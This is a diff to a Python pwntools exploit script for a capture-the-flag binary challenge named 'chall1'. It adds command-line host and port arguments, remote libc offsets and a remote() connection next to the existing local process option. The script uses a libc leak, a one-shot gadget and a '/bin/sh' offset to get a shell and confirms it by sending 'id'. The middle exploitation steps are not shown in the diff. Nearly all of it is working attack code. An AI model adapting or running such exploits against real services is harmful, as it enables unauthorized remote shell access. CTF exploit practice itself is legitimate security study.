@@ -1,11 +1,30 @@
 #!/usr/bin/python
 from pwn import *
+import sys
+
+HOST = ''
+PORT = 0
 
 LIBC = 0x067b58  # libc base
 FUNC = 0x03d0d3  # one shot gadget
 BASH = 0x17e0cf  # /bin/sh string incase system() falls in a good range (no nulls in it)
 
-io = process('../chall1')
+if len(sys.argv) > 1:
+	HOST = sys.argv[1]
+
+if len(sys.argv) > 2:
+	PORT = sys.argv[2]
+
+if len(HOST) > 0:
+	LIBC = 0x067378  # libc base
+	FUNC = 0x03cd10  # one shot gadget
+	BASH = 0x17b8cf  # /bin/sh string incase system() falls in a good range (no nulls in it)
+
+	io = remote(HOST, PORT)
+else:
+
+	io = process('../chall1')
+
 io.recvuntil('challenges\n\n')
 
 # step 1: leak
@@ -55,4 +74,4 @@ io.sendline()
 # step 4: enjoy a nice shell
 io.sendline('id')
 log.success('shell: %s' % io.recvline().strip())
-io.interactive()
+#io.interactive()
